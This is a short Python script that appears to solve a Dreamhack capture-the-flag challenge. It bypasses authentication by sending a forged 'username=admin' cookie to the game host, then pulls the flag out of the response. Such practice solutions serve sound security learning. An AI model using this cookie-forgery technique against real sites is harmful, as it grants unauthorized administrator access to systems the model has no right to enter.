import re
from requests import request as req

res = req(
    url="http://host8.dreamhack.games:8630/",
    method="GET",
    cookies={"username": "admin"},
)

flag = re.search("DH{.*}", res.text)

print(flag.group() if flag else "No flag")
